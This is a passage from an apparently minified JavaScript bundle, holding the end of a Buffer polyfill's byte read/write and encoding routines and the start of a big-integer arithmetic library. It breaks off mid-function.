              return (
                (e = +e),
                (n >>>= 0),
                i || q(t, 0, n, 8),
                r.write(t, e, n, o, 52, 8),
                n + 8
              );
            }
            (l.prototype.slice = function (t, e) {
              const n = this.length;
              (t = ~~t) < 0 ? (t += n) < 0 && (t = 0) : t > n && (t = n),
                (e = void 0 === e ? n : ~~e) < 0
                  ? (e += n) < 0 && (e = 0)
                  : e > n && (e = n),
                e < t && (e = t);
              const r = this.subarray(t, e);
              return Object.setPrototypeOf(r, l.prototype), r;
            }),
              (l.prototype.readUintLE = l.prototype.readUIntLE =
                function (t, e, n) {
                  (t >>>= 0), (e >>>= 0), n || L(t, e, this.length);
                  let r = this[t],
                    o = 1,
                    i = 0;
                  for (; ++i < e && (o *= 256); ) r += this[t + i] * o;
                  return r;
                }),
              (l.prototype.readUintBE = l.prototype.readUIntBE =
                function (t, e, n) {
                  (t >>>= 0), (e >>>= 0), n || L(t, e, this.length);
                  let r = this[t + --e],
                    o = 1;
                  for (; e > 0 && (o *= 256); ) r += this[t + --e] * o;
                  return r;
                }),
              (l.prototype.readUint8 = l.prototype.readUInt8 =
                function (t, e) {
                  return (t >>>= 0), e || L(t, 1, this.length), this[t];
                }),
              (l.prototype.readUint16LE = l.prototype.readUInt16LE =
                function (t, e) {
                  return (
                    (t >>>= 0),
                    e || L(t, 2, this.length),
                    this[t] | (this[t + 1] << 8)
                  );
                }),
              (l.prototype.readUint16BE = l.prototype.readUInt16BE =
                function (t, e) {
                  return (
                    (t >>>= 0),
                    e || L(t, 2, this.length),
                    (this[t] << 8) | this[t + 1]
                  );
                }),
              (l.prototype.readUint32LE = l.prototype.readUInt32LE =
                function (t, e) {
                  return (
                    (t >>>= 0),
                    e || L(t, 4, this.length),
                    (this[t] | (this[t + 1] << 8) | (this[t + 2] << 16)) +
                      16777216 * this[t + 3]
                  );
                }),
              (l.prototype.readUint32BE = l.prototype.readUInt32BE =
                function (t, e) {
                  return (
                    (t >>>= 0),
                    e || L(t, 4, this.length),
                    16777216 * this[t] +
                      ((this[t + 1] << 16) | (this[t + 2] << 8) | this[t + 3])
                  );
                }),
              (l.prototype.readBigUInt64LE = et(function (t) {
                V((t >>>= 0), "offset");
                const e = this[t],
                  n = this[t + 7];
                (void 0 !== e && void 0 !== n) || H(t, this.length - 8);
                const r =
                    e +
                    256 * this[++t] +
                    65536 * this[++t] +
                    this[++t] * 2 ** 24,
                  o =
                    this[++t] +
                    256 * this[++t] +
                    65536 * this[++t] +
                    n * 2 ** 24;
                return BigInt(r) + (BigInt(o) << BigInt(32));
              })),
              (l.prototype.readBigUInt64BE = et(function (t) {
                V((t >>>= 0), "offset");
                const e = this[t],
                  n = this[t + 7];
                (void 0 !== e && void 0 !== n) || H(t, this.length - 8);
                const r =
                    e * 2 ** 24 +
                    65536 * this[++t] +
                    256 * this[++t] +
                    this[++t],
                  o =
                    this[++t] * 2 ** 24 +
                    65536 * this[++t] +
                    256 * this[++t] +
                    n;
                return (BigInt(r) << BigInt(32)) + BigInt(o);
              })),
              (l.prototype.readIntLE = function (t, e, n) {
                (t >>>= 0), (e >>>= 0), n || L(t, e, this.length);
                let r = this[t],
                  o = 1,
                  i = 0;
                for (; ++i < e && (o *= 256); ) r += this[t + i] * o;
                return (o *= 128), r >= o && (r -= Math.pow(2, 8 * e)), r;
              }),
              (l.prototype.readIntBE = function (t, e, n) {
                (t >>>= 0), (e >>>= 0), n || L(t, e, this.length);
                let r = e,
                  o = 1,
                  i = this[t + --r];
                for (; r > 0 && (o *= 256); ) i += this[t + --r] * o;
                return (o *= 128), i >= o && (i -= Math.pow(2, 8 * e)), i;
              }),
              (l.prototype.readInt8 = function (t, e) {
                return (
                  (t >>>= 0),
                  e || L(t, 1, this.length),
                  128 & this[t] ? -1 * (255 - this[t] + 1) : this[t]
                );
              }),
              (l.prototype.readInt16LE = function (t, e) {
                (t >>>= 0), e || L(t, 2, this.length);
                const n = this[t] | (this[t + 1] << 8);
                return 32768 & n ? 4294901760 | n : n;
              }),
              (l.prototype.readInt16BE = function (t, e) {
                (t >>>= 0), e || L(t, 2, this.length);
                const n = this[t + 1] | (this[t] << 8);
                return 32768 & n ? 4294901760 | n : n;
              }),
              (l.prototype.readInt32LE = function (t, e) {
                return (
                  (t >>>= 0),
                  e || L(t, 4, this.length),
                  this[t] |
                    (this[t + 1] << 8) |
                    (this[t + 2] << 16) |
                    (this[t + 3] << 24)
                );
              }),
              (l.prototype.readInt32BE = function (t, e) {
                return (
                  (t >>>= 0),
                  e || L(t, 4, this.length),
                  (this[t] << 24) |
                    (this[t + 1] << 16) |
                    (this[t + 2] << 8) |
                    this[t + 3]
                );
              }),
              (l.prototype.readBigInt64LE = et(function (t) {
                V((t >>>= 0), "offset");
                const e = this[t],
                  n = this[t + 7];
                (void 0 !== e && void 0 !== n) || H(t, this.length - 8);
                const r =
                  this[t + 4] +
                  256 * this[t + 5] +
                  65536 * this[t + 6] +
                  (n << 24);
                return (
                  (BigInt(r) << BigInt(32)) +
                  BigInt(
                    e +
                      256 * this[++t] +
                      65536 * this[++t] +
                      this[++t] * 2 ** 24
                  )
                );
              })),
              (l.prototype.readBigInt64BE = et(function (t) {
                V((t >>>= 0), "offset");
                const e = this[t],
                  n = this[t + 7];
                (void 0 !== e && void 0 !== n) || H(t, this.length - 8);
                const r =
                  (e << 24) + 65536 * this[++t] + 256 * this[++t] + this[++t];
                return (
                  (BigInt(r) << BigInt(32)) +
                  BigInt(
                    this[++t] * 2 ** 24 +
                      65536 * this[++t] +
                      256 * this[++t] +
                      n
                  )
                );
              })),
              (l.prototype.readFloatLE = function (t, e) {
                return (
                  (t >>>= 0),
                  e || L(t, 4, this.length),
                  r.read(this, t, !0, 23, 4)
                );
              }),
              (l.prototype.readFloatBE = function (t, e) {
                return (
                  (t >>>= 0),
                  e || L(t, 4, this.length),
                  r.read(this, t, !1, 23, 4)
                );
              }),
              (l.prototype.readDoubleLE = function (t, e) {
                return (
                  (t >>>= 0),
                  e || L(t, 8, this.length),
                  r.read(this, t, !0, 52, 8)
                );
              }),
              (l.prototype.readDoubleBE = function (t, e) {
                return (
                  (t >>>= 0),
                  e || L(t, 8, this.length),
                  r.read(this, t, !1, 52, 8)
                );
              }),
              (l.prototype.writeUintLE = l.prototype.writeUIntLE =
                function (t, e, n, r) {
                  if (((t = +t), (e >>>= 0), (n >>>= 0), !r)) {
                    N(this, t, e, n, Math.pow(2, 8 * n) - 1, 0);
                  }
                  let o = 1,
                    i = 0;
                  for (this[e] = 255 & t; ++i < n && (o *= 256); )
                    this[e + i] = (t / o) & 255;
                  return e + n;
                }),
              (l.prototype.writeUintBE = l.prototype.writeUIntBE =
                function (t, e, n, r) {
                  if (((t = +t), (e >>>= 0), (n >>>= 0), !r)) {
                    N(this, t, e, n, Math.pow(2, 8 * n) - 1, 0);
                  }
                  let o = n - 1,
                    i = 1;
                  for (this[e + o] = 255 & t; --o >= 0 && (i *= 256); )
                    this[e + o] = (t / i) & 255;
                  return e + n;
                }),
              (l.prototype.writeUint8 = l.prototype.writeUInt8 =
                function (t, e, n) {
                  return (
                    (t = +t),
                    (e >>>= 0),
                    n || N(this, t, e, 1, 255, 0),
                    (this[e] = 255 & t),
                    e + 1
                  );
                }),
              (l.prototype.writeUint16LE = l.prototype.writeUInt16LE =
                function (t, e, n) {
                  return (
                    (t = +t),
                    (e >>>= 0),
                    n || N(this, t, e, 2, 65535, 0),
                    (this[e] = 255 & t),
                    (this[e + 1] = t >>> 8),
                    e + 2
                  );
                }),
              (l.prototype.writeUint16BE = l.prototype.writeUInt16BE =
                function (t, e, n) {
                  return (
                    (t = +t),
                    (e >>>= 0),
                    n || N(this, t, e, 2, 65535, 0),
                    (this[e] = t >>> 8),
                    (this[e + 1] = 255 & t),
                    e + 2
                  );
                }),
              (l.prototype.writeUint32LE = l.prototype.writeUInt32LE =
                function (t, e, n) {
                  return (
                    (t = +t),
                    (e >>>= 0),
                    n || N(this, t, e, 4, 4294967295, 0),
                    (this[e + 3] = t >>> 24),
                    (this[e + 2] = t >>> 16),
                    (this[e + 1] = t >>> 8),
                    (this[e] = 255 & t),
                    e + 4
                  );
                }),
              (l.prototype.writeUint32BE = l.prototype.writeUInt32BE =
                function (t, e, n) {
                  return (
                    (t = +t),
                    (e >>>= 0),
                    n || N(this, t, e, 4, 4294967295, 0),
                    (this[e] = t >>> 24),
                    (this[e + 1] = t >>> 16),
                    (this[e + 2] = t >>> 8),
                    (this[e + 3] = 255 & t),
                    e + 4
                  );
                }),
              (l.prototype.writeBigUInt64LE = et(function (t, e = 0) {
                return D(this, t, e, BigInt(0), BigInt("0xffffffffffffffff"));
              })),
              (l.prototype.writeBigUInt64BE = et(function (t, e = 0) {
                return U(this, t, e, BigInt(0), BigInt("0xffffffffffffffff"));
              })),
              (l.prototype.writeIntLE = function (t, e, n, r) {
                if (((t = +t), (e >>>= 0), !r)) {
                  const r = Math.pow(2, 8 * n - 1);
                  N(this, t, e, n, r - 1, -r);
                }
                let o = 0,
                  i = 1,
                  s = 0;
                for (this[e] = 255 & t; ++o < n && (i *= 256); )
                  t < 0 && 0 === s && 0 !== this[e + o - 1] && (s = 1),
                    (this[e + o] = (((t / i) | 0) - s) & 255);
                return e + n;
              }),
              (l.prototype.writeIntBE = function (t, e, n, r) {
                if (((t = +t), (e >>>= 0), !r)) {
                  const r = Math.pow(2, 8 * n - 1);
                  N(this, t, e, n, r - 1, -r);
                }
                let o = n - 1,
                  i = 1,
                  s = 0;
                for (this[e + o] = 255 & t; --o >= 0 && (i *= 256); )
                  t < 0 && 0 === s && 0 !== this[e + o + 1] && (s = 1),
                    (this[e + o] = (((t / i) | 0) - s) & 255);
                return e + n;
              }),
              (l.prototype.writeInt8 = function (t, e, n) {
                return (
                  (t = +t),
                  (e >>>= 0),
                  n || N(this, t, e, 1, 127, -128),
                  t < 0 && (t = 255 + t + 1),
                  (this[e] = 255 & t),
                  e + 1
                );
              }),
              (l.prototype.writeInt16LE = function (t, e, n) {
                return (
                  (t = +t),
                  (e >>>= 0),
                  n || N(this, t, e, 2, 32767, -32768),
                  (this[e] = 255 & t),
                  (this[e + 1] = t >>> 8),
                  e + 2
                );
              }),
              (l.prototype.writeInt16BE = function (t, e, n) {
                return (
                  (t = +t),
                  (e >>>= 0),
                  n || N(this, t, e, 2, 32767, -32768),
                  (this[e] = t >>> 8),
                  (this[e + 1] = 255 & t),
                  e + 2
                );
              }),
              (l.prototype.writeInt32LE = function (t, e, n) {
                return (
                  (t = +t),
                  (e >>>= 0),
                  n || N(this, t, e, 4, 2147483647, -2147483648),
                  (this[e] = 255 & t),
                  (this[e + 1] = t >>> 8),
                  (this[e + 2] = t >>> 16),
                  (this[e + 3] = t >>> 24),
                  e + 4
                );
              }),
              (l.prototype.writeInt32BE = function (t, e, n) {
                return (
                  (t = +t),
                  (e >>>= 0),
                  n || N(this, t, e, 4, 2147483647, -2147483648),
                  t < 0 && (t = 4294967295 + t + 1),
                  (this[e] = t >>> 24),
                  (this[e + 1] = t >>> 16),
                  (this[e + 2] = t >>> 8),
                  (this[e + 3] = 255 & t),
                  e + 4
                );
              }),
              (l.prototype.writeBigInt64LE = et(function (t, e = 0) {
                return D(
                  this,
                  t,
                  e,
                  -BigInt("0x8000000000000000"),
                  BigInt("0x7fffffffffffffff")
                );
              })),
              (l.prototype.writeBigInt64BE = et(function (t, e = 0) {
                return U(
                  this,
                  t,
                  e,
                  -BigInt("0x8000000000000000"),
                  BigInt("0x7fffffffffffffff")
                );
              })),
              (l.prototype.writeFloatLE = function (t, e, n) {
                return W(this, t, e, !0, n);
              }),
              (l.prototype.writeFloatBE = function (t, e, n) {
                return W(this, t, e, !1, n);
              }),
              (l.prototype.writeDoubleLE = function (t, e, n) {
                return z(this, t, e, !0, n);
              }),
              (l.prototype.writeDoubleBE = function (t, e, n) {
                return z(this, t, e, !1, n);
              }),
              (l.prototype.copy = function (t, e, n, r) {
                if (!l.isBuffer(t))
                  throw new TypeError("argument should be a Buffer");
                if (
                  (n || (n = 0),
                  r || 0 === r || (r = this.length),
                  e >= t.length && (e = t.length),
                  e || (e = 0),
                  r > 0 && r < n && (r = n),
                  r === n)
                )
                  return 0;
                if (0 === t.length || 0 === this.length) return 0;
                if (e < 0) throw new RangeError("targetStart out of bounds");
                if (n < 0 || n >= this.length)
                  throw new RangeError("Index out of range");
                if (r < 0) throw new RangeError("sourceEnd out of bounds");
                r > this.length && (r = this.length),
                  t.length - e < r - n && (r = t.length - e + n);
                const o = r - n;
                return (
                  this === t && "function" == typeof s.prototype.copyWithin
                    ? this.copyWithin(e, n, r)
                    : s.prototype.set.call(t, this.subarray(n, r), e),
                  o
                );
              }),
              (l.prototype.fill = function (t, e, n, r) {
                if ("string" == typeof t) {
                  if (
                    ("string" == typeof e
                      ? ((r = e), (e = 0), (n = this.length))
                      : "string" == typeof n && ((r = n), (n = this.length)),
                    void 0 !== r && "string" != typeof r)
                  )
                    throw new TypeError("encoding must be a string");
                  if ("string" == typeof r && !l.isEncoding(r))
                    throw new TypeError("Unknown encoding: " + r);
                  if (1 === t.length) {
                    const e = t.charCodeAt(0);
                    (("utf8" === r && e < 128) || "latin1" === r) && (t = e);
                  }
                } else
                  "number" == typeof t
                    ? (t &= 255)
                    : "boolean" == typeof t && (t = Number(t));
                if (e < 0 || this.length < e || this.length < n)
                  throw new RangeError("Out of range index");
                if (n <= e) return this;
                let o;
                if (
                  ((e >>>= 0),
                  (n = void 0 === n ? this.length : n >>> 0),
                  t || (t = 0),
                  "number" == typeof t)
                )
                  for (o = e; o < n; ++o) this[o] = t;
                else {
                  const i = l.isBuffer(t) ? t : l.from(t, r),
                    s = i.length;
                  if (0 === s)
                    throw new TypeError(
                      'The value "' + t + '" is invalid for argument "value"'
                    );
                  for (o = 0; o < n - e; ++o) this[o + e] = i[o % s];
                }
                return this;
              });
            const K = {};
            function F(t, e, n) {
              K[t] = class extends n {
                constructor() {
                  super(),
                    Object.defineProperty(this, "message", {
                      value: e.apply(this, arguments),
                      writable: !0,
                      configurable: !0,
                    }),
                    (this.name = `${this.name} [${t}]`),
                    this.stack,
                    delete this.name;
                }
                get code() {
                  return t;
                }
                set code(t) {
                  Object.defineProperty(this, "code", {
                    configurable: !0,
                    enumerable: !0,
                    value: t,
                    writable: !0,
                  });
                }
                toString() {
                  return `${this.name} [${t}]: ${this.message}`;
                }
              };
            }
            function j(t) {
              let e = "",
                n = t.length;
              const r = "-" === t[0] ? 1 : 0;
              for (; n >= r + 4; n -= 3) e = `_${t.slice(n - 3, n)}${e}`;
              return `${t.slice(0, n)}${e}`;
            }
            function G(t, e, n, r, o, i) {
              if (t > n || t < e) {
                const n = "bigint" == typeof e ? "n" : "";
                let r;
                throw (
                  ((r =
                    0 === e || e === BigInt(0)
                      ? `>= 0${n} and < 2${n} ** ${8 * (i + 1)}${n}`
                      : `>= -(2${n} ** ${8 * (i + 1) - 1}${n}) and < 2 ** ${
                          8 * (i + 1) - 1
                        }${n}`),
                  new K.ERR_OUT_OF_RANGE("value", r, t))
                );
              }
              !(function (t, e, n) {
                V(e, "offset"),
                  (void 0 !== t[e] && void 0 !== t[e + n]) ||
                    H(e, t.length - (n + 1));
              })(r, o, i);
            }
            function V(t, e) {
              if ("number" != typeof t)
                throw new K.ERR_INVALID_ARG_TYPE(e, "number", t);
            }
            function H(t, e, n) {
              if (Math.floor(t) !== t)
                throw (
                  (V(t, n), new K.ERR_OUT_OF_RANGE("offset", "an integer", t))
                );
              if (e < 0) throw new K.ERR_BUFFER_OUT_OF_BOUNDS();
              throw new K.ERR_OUT_OF_RANGE("offset", `>= 0 and <= ${e}`, t);
            }
            F(
              "ERR_BUFFER_OUT_OF_BOUNDS",
              function (t) {
                return t
                  ? `${t} is outside of buffer bounds`
                  : "Attempt to access memory outside buffer bounds";
              },
              RangeError
            ),
              F(
                "ERR_INVALID_ARG_TYPE",
                function (t, e) {
                  return `The "${t}" argument must be of type number. Received type ${typeof e}`;
                },
                TypeError
              ),
              F(
                "ERR_OUT_OF_RANGE",
                function (t, e, n) {
                  let r = `The value of "${t}" is out of range.`,
                    o = n;
                  return (
                    Number.isInteger(n) && Math.abs(n) > 2 ** 32
                      ? (o = j(String(n)))
                      : "bigint" == typeof n &&
                        ((o = String(n)),
                        (n > BigInt(2) ** BigInt(32) ||
                          n < -(BigInt(2) ** BigInt(32))) &&
                          (o = j(o)),
                        (o += "n")),
                    (r += ` It must be ${e}. Received ${o}`),
                    r
                  );
                },
                RangeError
              );
            const X = /[^+/0-9A-Za-z-_]/g;
            function Z(t, e) {
              let n;
              e = e || 1 / 0;
              const r = t.length;
              let o = null;
              const i = [];
              for (let s = 0; s < r; ++s) {
                if (((n = t.charCodeAt(s)), n > 55295 && n < 57344)) {
                  if (!o) {
                    if (n > 56319) {
                      (e -= 3) > -1 && i.push(239, 191, 189);
                      continue;
                    }
                    if (s + 1 === r) {
                      (e -= 3) > -1 && i.push(239, 191, 189);
                      continue;
                    }
                    o = n;
                    continue;
                  }
                  if (n < 56320) {
                    (e -= 3) > -1 && i.push(239, 191, 189), (o = n);
                    continue;
                  }
                  n = 65536 + (((o - 55296) << 10) | (n - 56320));
                } else o && (e -= 3) > -1 && i.push(239, 191, 189);
                if (((o = null), n < 128)) {
                  if ((e -= 1) < 0) break;
                  i.push(n);
                } else if (n < 2048) {
                  if ((e -= 2) < 0) break;
                  i.push((n >> 6) | 192, (63 & n) | 128);
                } else if (n < 65536) {
                  if ((e -= 3) < 0) break;
                  i.push(
                    (n >> 12) | 224,
                    ((n >> 6) & 63) | 128,
                    (63 & n) | 128
                  );
                } else {
                  if (!(n < 1114112)) throw new Error("Invalid code point");
                  if ((e -= 4) < 0) break;
                  i.push(
                    (n >> 18) | 240,
                    ((n >> 12) & 63) | 128,
                    ((n >> 6) & 63) | 128,
                    (63 & n) | 128
                  );
                }
              }
              return i;
            }
            function J(t) {
              return e.toByteArray(
                (function (t) {
                  if (
                    (t = (t = t.split("=")[0]).trim().replace(X, "")).length < 2
                  )
                    return "";
                  for (; t.length % 4 != 0; ) t += "=";
                  return t;
                })(t)
              );
            }
            function Y(t, e, n, r) {
              let o;
              for (o = 0; o < r && !(o + n >= e.length || o >= t.length); ++o)
                e[o + n] = t[o];
              return o;
            }
            function Q(t, e) {
              return (
                t instanceof e ||
                (null != t &&
                  null != t.constructor &&
                  null != t.constructor.name &&
                  t.constructor.name === e.name)
              );
            }
            function $(t) {
              return t != t;
            }
            const tt = (function () {
              const t = "0123456789abcdef",
                e = new Array(256);
              for (let n = 0; n < 16; ++n) {
                const r = 16 * n;
                for (let o = 0; o < 16; ++o) e[r + o] = t[n] + t[o];
              }
              return e;
            })();
            function et(t) {
              return "undefined" == typeof BigInt ? nt : t;
            }
            function nt() {
              throw new Error("BigInt not supported");
            }
          })(e);
          const f = e.Buffer;
          (t.Blob = e.Blob),
            (t.BlobOptions = e.BlobOptions),
            (t.Buffer = e.Buffer),
            (t.File = e.File),
            (t.FileOptions = e.FileOptions),
            (t.INSPECT_MAX_BYTES = e.INSPECT_MAX_BYTES),
            (t.SlowBuffer = e.SlowBuffer),
            (t.TranscodeEncoding = e.TranscodeEncoding),
            (t.atob = e.atob),
            (t.btoa = e.btoa),
            (t.constants = e.constants),
            (t.default = f),
            (t.isAscii = e.isAscii),
            (t.isUtf8 = e.isUtf8),
            (t.kMaxLength = e.kMaxLength),
            (t.kStringMaxLength = e.kStringMaxLength),
            (t.resolveObjectURL = e.resolveObjectURL),
            (t.transcode = e.transcode);
        })(Fn)),
      Fn
    );
  }
  var Gn,
    Vn = Kn.exports;
  function Hn() {
    return (
      Gn ||
        ((Gn = 1),
        (t = Kn),
        (window.skCrypt = function (t) {
          return function () {
            return t;
          };
        }),
        (function (t, e) {
          function n(t, e) {
            if (!t) throw new Error(e || "Assertion failed");
          }
          function r(t, e) {
            t.super_ = e;
            var n = function () {};
            (n.prototype = e.prototype),
              (t.prototype = new n()),
              (t.prototype.constructor = t);
          }
          function o(t, e, n) {
            if (o.isBN(t)) return t;
            (this.negative = 0),
              (this.words = null),
              (this.length = 0),
              (this.red = null),
              null !== t &&
                (("le" !== e && "be" !== e) || ((n = e), (e = 10)),
                this._init(t || 0, e || 10, n || "be"));
          }
          var i;
          "object" == typeof t ? (t.exports = o) : (e.BN = o),
            (o.BN = o),
            (o.wordSize = 26);
          try {
            i =
              "undefined" != typeof window && void 0 !== window.Buffer
                ? window.Buffer
                : jn().Buffer;
          } catch (T) {}
          function s(t, e) {
            var r = t.charCodeAt(e);
            return r >= 48 && r <= 57
              ? r - 48
              : r >= 65 && r <= 70
              ? r - 55
              : r >= 97 && r <= 102
              ? r - 87
              : (n(!1, "Invalid character in " + t), void 0);
          }
          function a(t, e, n) {
            var r = s(t, n);
            return n - 1 >= e && (r |= s(t, n - 1) << 4), r;
          }
          function u(t, e, r, o) {
            for (
              var i = 0, s = 0, a = Math.min(t.length, r), u = e;
              u < a;
              u++
            ) {
              var c = t.charCodeAt(u) - 48;
              (i *= o),
                (s = c >= 49 ? c - 49 + 10 : c >= 17 ? c - 17 + 10 : c),
                n(c >= 0 && s < o, "Invalid character"),
                (i += s);
            }
            return i;
          }
          function c(t, e) {
            (t.words = e.words),
              (t.length = e.length),
              (t.negative = e.negative),
              (t.red = e.red);
          }
          if (
            ((o.isBN = function (t) {
              return (
                t instanceof o ||
                (null !== t &&
                  "object" == typeof t &&
                  t.constructor.wordSize === o.wordSize &&
                  Array.isArray(t.words))
              );
            }),
            (o.max = function (t, e) {
              return t.cmp(e) > 0 ? t : e;
            }),
            (o.min = function (t, e) {
              return t.cmp(e) < 0 ? t : e;
            }),
            (o.prototype._init = function (t, e, r) {
              if ("number" == typeof t) return this._initNumber(t, e, r);
              if ("object" == typeof t) return this._initArray(t, e, r);
              "hex" === e && (e = 16), n(e === (0 | e) && e >= 2 && e <= 36);
              var o = 0;
              "-" === (t = t.toString().replace(/\s+/g, ""))[0] &&
                (o++, (this.negative = 1)),
                o < t.length &&
                  (16 === e
                    ? this._parseHex(t, o, r)
                    : (this._parseBase(t, e, o),
                      "le" === r && this._initArray(this.toArray(), e, r)));
            }),
            (o.prototype._initNumber = function (t, e, r) {
              t < 0 && ((this.negative = 1), (t = -t)),
                t < 67108864
                  ? ((this.words = [67108863 & t]), (this.length = 1))
                  : t < 4503599627370496
                  ? ((this.words = [67108863 & t, (t / 67108864) & 67108863]),
                    (this.length = 2))
                  : (n(t < 9007199254740992),
                    (this.words = [67108863 & t, (t / 67108864) & 67108863, 1]),
                    (this.length = 3)),
                "le" === r && this._initArray(this.toArray(), e, r);
            }),
            (o.prototype._initArray = function (t, e, r) {
              if ((n("number" == typeof t.length), t.length <= 0))
                return (this.words = [0]), (this.length = 1), this;
              (this.length = Math.ceil(t.length / 3)),
                (this.words = new Array(this.length));
              for (var o = 0; o < this.length; o++) this.words[o] = 0;
              var i,
                s,
                a = 0;
              if ("be" === r)
                for (o = t.length - 1, i = 0; o >= 0; o -= 3)
                  (s = t[o] | (t[o - 1] << 8) | (t[o - 2] << 16)),
                    (this.words[i] |= (s << a) & 67108863),
                    (this.words[i + 1] = (s >>> (26 - a)) & 67108863),
                    (a += 24) >= 26 && ((a -= 26), i++);
              else if ("le" === r)
                for (o = 0, i = 0; o < t.length; o += 3)
                  (s = t[o] | (t[o + 1] << 8) | (t[o + 2] << 16)),
                    (this.words[i] |= (s << a) & 67108863),
                    (this.words[i + 1] = (s >>> (26 - a)) & 67108863),
                    (a += 24) >= 26 && ((a -= 26), i++);
              return this._strip();
            }),
            (o.prototype._parseHex = function (t, e, n) {
              (this.length = Math.ceil((t.length - e) / 6)),
                (this.words = new Array(this.length));
              for (var r = 0; r < this.length; r++) this.words[r] = 0;
              var o,
                i = 0,
                s = 0;
              if ("be" === n)
                for (r = t.length - 1; r >= e; r -= 2)
                  (o = a(t, e, r) << i),
                    (this.words[s] |= 67108863 & o),
                    i >= 18
                      ? ((i -= 18), (s += 1), (this.words[s] |= o >>> 26))
                      : (i += 8);
              else
                for (
                  r = (t.length - e) % 2 == 0 ? e + 1 : e;
                  r < t.length;
                  r += 2
                )
                  (o = a(t, e, r) << i),
                    (this.words[s] |= 67108863 & o),
                    i >= 18
                      ? ((i -= 18), (s += 1), (this.words[s] |= o >>> 26))
                      : (i += 8);
              this._strip();
            }),
            (o.prototype._parseBase = function (t, e, n) {
              (this.words = [0]), (this.length = 1);
              for (var r = 0, o = 1; o <= 67108863; o *= e) r++;
              r--, (o = (o / e) | 0);
              for (
                var i = t.length - n,
                  s = i % r,
                  a = Math.min(i, i - s) + n,
                  c = 0,
                  l = n;
                l < a;
                l += r
              )
                (c = u(t, l, l + r, e)),
                  this.imuln(o),
                  this.words[0] + c < 67108864
                    ? (this.words[0] += c)
                    : this._iaddn(c);
              if (0 !== s) {
                var d = 1;
                for (c = u(t, l, t.length, e), l = 0; l < s; l++) d *= e;
                this.imuln(d),
                  this.words[0] + c < 67108864
                    ? (this.words[0] += c)
                    : this._iaddn(c);
              }
              this._strip();
            }),
            (o.prototype.copy = function (t) {
              t.words = new Array(this.length);
              for (var e = 0; e < this.length; e++) t.words[e] = this.words[e];
              (t.length = this.length),
                (t.negative = this.negative),
                (t.red = this.red);
            }),
            (o.prototype._move = function (t) {
              c(t, this);
            }),
            (o.prototype.clone = function () {
              var t = new o(null);
              return this.copy(t), t;
            }),
            (o.prototype._expand = function (t) {
              for (; this.length < t; ) this.words[this.length++] = 0;
              return this;
            }),
            (o.prototype._strip = function () {
              for (; this.length > 1 && 0 === this.words[this.length - 1]; )
                this.length--;
              return this._normSign();
            }),
            (o.prototype._normSign = function () {
              return (
                1 === this.length && 0 === this.words[0] && (this.negative = 0),
                this
              );
            }),
            "undefined" != typeof Symbol && "function" == typeof Symbol.for)
          )
            try {
              o.prototype[Symbol.for("nodejs.util.inspect.custom")] = l;
            } catch (T) {
              o.prototype.inspect = l;
            }
          else o.prototype.inspect = l;
          function l() {
            return (this.red ? "<BN-R: " : "<BN: ") + this.toString(16) + ">";
          }
          var d = [
              "",
              "0",
              "00",
              "000",
              "0000",
              "00000",
              "000000",
              "0000000",
              "00000000",
              "000000000",
              "0000000000",
              "00000000000",
              "000000000000",
              "0000000000000",
              "00000000000000",
              "000000000000000",
              "0000000000000000",
              "00000000000000000",
              "000000000000000000",
              "0000000000000000000",
              "00000000000000000000",
              "000000000000000000000",
              "0000000000000000000000",
              "00000000000000000000000",
              "000000000000000000000000",
              "0000000000000000000000000",
            ],
            f = [
              0, 0, 25, 16, 12, 11, 10, 9, 8, 8, 7, 7, 7, 7, 6, 6, 6, 6, 6, 6,
              6, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5,
            ],
            h = [
              0, 0, 33554432, 43046721, 16777216, 48828125, 60466176, 40353607,
              16777216, 43046721, 1e7, 19487171, 35831808, 62748517, 7529536,
              11390625, 16777216, 24137569, 34012224, 47045881, 64e6, 4084101,
              5153632, 6436343, 7962624, 9765625, 11881376, 14348907, 17210368,
              20511149, 243e5, 28629151, 33554432, 39135393, 45435424, 52521875,
              60466176,
            ];
          function p(t, e, n) {
            n.negative = e.negative ^ t.negative;
            var r = (t.length + e.length) | 0;
            (n.length = r), (r = (r - 1) | 0);
            var o = 0 | t.words[0],
              i = 0 | e.words[0],
              s = o * i,
              a = 67108863 & s,
              u = (s / 67108864) | 0;
            n.words[0] = a;
            for (var c = 1; c < r; c++) {
              for (
                var l = u >>> 26,
                  d = 67108863 & u,
                  f = Math.min(c, e.length - 1),
                  h = Math.max(0, c - t.length + 1);
                h <= f;
                h++
              ) {
                var p = (c - h) | 0;
                (l +=
                  ((s = (o = 0 | t.words[p]) * (i = 0 | e.words[h]) + d) /
                    67108864) |
                  0),
                  (d = 67108863 & s);
              }
              (n.words[c] = 0 | d), (u = 0 | l);
            }
            return 0 !== u ? (n.words[c] = 0 | u) : n.length--, n._strip();
          }
          (o.prototype.toString = function (t, e) {
            var r;
            if (((e = 0 | e || 1), 16 === (t = t || 10) || "hex" === t)) {
              r = "";
              for (var o = 0, i = 0, s = 0; s < this.length; s++) {
                var a = this.words[s],
                  u = (16777215 & ((a << o) | i)).toString(16);
                (i = (a >>> (24 - o)) & 16777215),
                  (o += 2) >= 26 && ((o -= 26), s--),
                  (r =
                    0 !== i || s !== this.length - 1
                      ? d[6 - u.length] + u + r
                      : u + r);
              }
              for (0 !== i && (r = i.toString(16) + r); r.length % e !== 0; )
                r = "0" + r;
              return 0 !== this.negative && (r = "-" + r), r;
            }
            if (t === (0 | t) && t >= 2 && t <= 36) {
              var c = f[t],
                l = h[t];
              r = "";
              var p = this.clone();
              for (p.negative = 0; !p.isZero(); ) {
                var m = p.modrn(l).toString(t);
                r = (p = p.idivn(l)).isZero() ? m + r : d[c - m.length] + m + r;
              }
              for (this.isZero() && (r = "0" + r); r.length % e !== 0; )
                r = "0" + r;
              return 0 !== this.negative && (r = "-" + r), r;
            }
            n(!1, "Base should be between 2 and 36");
          }),
            (o.prototype.toNumber = function () {
              var t = this.words[0];
              return (
                2 === this.length
                  ? (t += 67108864 * this.words[1])
                  : 3 === this.length && 1 === this.words[2]
                  ? (t += 4503599627370496 + 67108864 * this.words[1])
                  : this.length > 2 &&
                    n(!1, "Number can only safely store up to 53 bits"),
                0 !== this.negative ? -t : t
              );
            }),
            (o.prototype.toJSON = function () {
              return this.toString(16, 2);
            }),
            i &&
              (o.prototype.toBuffer = function (t, e) {
                return this.toArrayLike(i, t, e);
              }),
            (o.prototype.toArray = function (t, e) {
              return this.toArrayLike(Array, t, e);
            }),
            (o.prototype.toArrayLike = function (t, e, r) {
              this._strip();
              var o = this.byteLength(),
                i = r || Math.max(1, o);
